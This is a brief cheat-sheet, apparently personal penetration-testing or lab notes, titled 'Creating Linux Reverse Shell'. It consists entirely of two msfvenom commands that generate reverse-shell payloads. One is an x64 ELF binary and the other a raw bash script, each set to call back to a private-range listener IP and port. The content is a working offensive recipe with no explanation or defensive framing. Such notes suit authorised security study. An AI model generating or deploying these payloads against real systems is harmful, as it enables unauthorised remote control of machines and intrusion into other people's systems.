# Creating Linux Reverse Shell

---

## Syntax

```
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.45.164 lport=80 -f elf > shell
```
```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.219 LPORT=9090 -f raw > reverse.sh
```
